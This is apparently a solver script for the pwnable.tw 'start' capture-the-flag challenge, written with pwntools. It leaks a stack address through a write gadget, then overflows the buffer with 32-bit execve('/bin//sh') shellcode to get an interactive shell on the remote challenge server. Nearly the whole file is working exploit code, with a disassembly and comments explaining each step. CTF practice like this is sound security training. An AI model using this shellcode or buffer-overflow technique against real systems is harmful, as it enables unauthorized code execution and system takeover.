#! /usr/bin/python

from pwn import *

# on remote machine ASLR is turned on, sometimes script fails, so have to repeat script multiply times, until lucky
# https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html 


# nc chall.pwnable.tw 10000
s = remote('chall.pwnable.tw', 10000)
#s = process('./start')

sc = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\x31\xd2\xcd\x80' 

'''
 0:    31 c0                    xor    eax, eax
 2:    50                       push   eax
 3:    68 2f 2f 73 68           push   0x68732f2f
 8:    68 2f 62 69 6e           push   0x6e69622f
 d:    89 e3                    mov    ebx, esp
 f:    50                       push   eax
10:    53                       push   ebx
11:    89 e1                    mov    ecx, esp
13:    b0 0b                    mov    al, 0xb
15:    31 d2                    xor    edx, edx 
17:    cd 80                    int    0x80  
'''

padding = 20

'''
mov	ecx, esp        ; data to write ( esp: 0xffffcfdc --> 0xffffcf0a --> 0x0)
mov	dl, 0x14	; data length
mov	bl, 1	        ; file descriptor (stdout)
mov	al, 4		; write syscall number 
int	0x80		; syscall
'''
#0x08048087 : mov ecx, esp ; mov dl, 0x14 ; mov bl, 1 ; mov al, 4 ; int 0x80
write_gadget = 0x8048087


payload1 = 'A' * padding
payload1 += p32(write_gadget)

gdb.attach(s)

s.sendlineafter('CTF:', payload1)

leak = u32(s.recv(4))
print 'leak', hex(leak) #  0xffffcf0a
#sc_addr = 0xffffcfdc
#offset = 0xffffcfdc - 0xffffcf0a = 0xd2 
sc_addr = leak + 0xd2 + 0x18

log.info('sc_addr = ' + hex(sc_addr))

payload2 = 'B' * padding
payload2 += p32(sc_addr)
payload2 += sc

s.sendline(payload2)
s.interactive()

'''
gdb-peda$ disass _start
Dump of assembler code for function _start:
   0x08048060 <+0>:	push   esp
   0x08048061 <+1>:	push   0x804809d
   0x08048066 <+6>:	xor    eax,eax
   0x08048068 <+8>:	xor    ebx,ebx
   0x0804806a <+10>:	xor    ecx,ecx
   0x0804806c <+12>:	xor    edx,edx
   0x0804806e <+14>:	push   0x3a465443
   0x08048073 <+19>:	push   0x20656874
   0x08048078 <+24>:	push   0x20747261
   0x0804807d <+29>:	push   0x74732073
   0x08048082 <+34>:	push   0x2774654c
   0x08048087 <+39>:	mov    ecx,esp         <--- write_gadget
   0x08048089 <+41>:	mov    dl,0x14
   0x0804808b <+43>:	mov    bl,0x1
   0x0804808d <+45>:	mov    al,0x4
   0x0804808f <+47>:	int    0x80            <---|
   0x08048091 <+49>:	xor    ebx,ebx         <--- next gone be read syscall  
   0x08048093 <+51>:	mov    dl,0x3c
   0x08048095 <+53>:	mov    al,0x3
   0x08048097 <+55>:	int    0x80            <---|
=> 0x08048099 <+57>:	add    esp,0x14
   0x0804809c <+60>:	ret    
End of assembler dump.


read syscall in our case:

        ecx is still: 0xffffcfdc --> 0xffffcf0a --> 0x0  addr to read data into
xor     ebx,ebx         ; file descriptor (stdin)
mov     dl,0x3c         ; data length
mov     al,0x3          ; read syscall number
int	0x80		; call kernel
'''


























